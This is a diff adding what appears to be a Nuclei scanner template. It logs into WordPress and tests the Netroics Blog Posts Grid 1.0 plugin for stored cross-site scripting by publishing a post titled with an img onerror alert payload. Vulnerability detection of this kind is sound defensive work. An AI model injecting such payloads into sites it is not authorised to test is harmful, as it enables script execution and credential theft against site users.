@@ -1,0 +1,101 @@
+id: wordpress-plugin-netroics-blog-posts-grid-xss
+
+info:
+  name: WordPress Plugin Netroics Blog Posts Grid 1.0 - XSS
+  author: LRTK-CODER
+  severity: medium
+  description: |
+    WordPress Plugin "Netroics Blog Posts Grid" is prone to a stored cross-site scripting (XSS) vulnerability because it fails to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker tto steal cookie-based authentication credentials and launch other attacks. Wordpress Plugin "Netroics Blog Posts Grid" version 1.0 is vulnerable; prior versions may also be affected.
+  reference:
+    - https://www.exploit-db.com/exploits/51008
+  tags: wordpress, wp, plugin, xss
+
+headless:
+  - steps:
+      # ---- Login Process ----
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/wp-login.php"
+          
+      - action: waitload
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: /html/body/div[1]/form/p[1]/input
+          
+      - action: waitload
+      
+      - action: text
+        args:
+          by: xpath
+          xpath: /html/body/div[1]/form/p[1]/input
+          value: "{{username}}"
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: /html/body/div[1]/form/div/div/input
+      
+      - action: waitload
+      
+      - action: text
+        args:
+          by: xpath
+          xpath: /html/body/div[1]/form/div/div/input
+          value: "{{password}}"
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: /html/body/div[1]/form/p[3]/input[1]
+        
+      - action: waitload
+      # ---- Login Process End ----
+      
+      # ---- Writing Netroics Posts Plugin ----
+      - action: click
+        args:
+          by: xpath
+          xpath: //*/a/div[text()='Netroics Posts']
+      
+      - action: waitload
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: //div/a[text()='Add New']
+      
+      - action: waitload
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: //*[@id="title"]
+      
+      - action: waitload
+      
+      - action: text
+        args:
+          by: xpath
+          xpath: //*[@id="title"]
+          value: test"><img/src=""/onerror="alert(1234)"/>
+      
+      - action: click
+        args:
+          by: xpath
+          xpath: //*[@id="publish"]
+      
+      - action: waitload
+      # ---- Writing Netroics Posts Plugin End ----
+      
+      # ---- Move uploaded page ----
+      - action: click
+        args:
+          by: xpath
+          xpath: //*[@id="post-preview"]
+        
+    matchers:
+      - type: word
+        words:
+          - "alert(1234)"
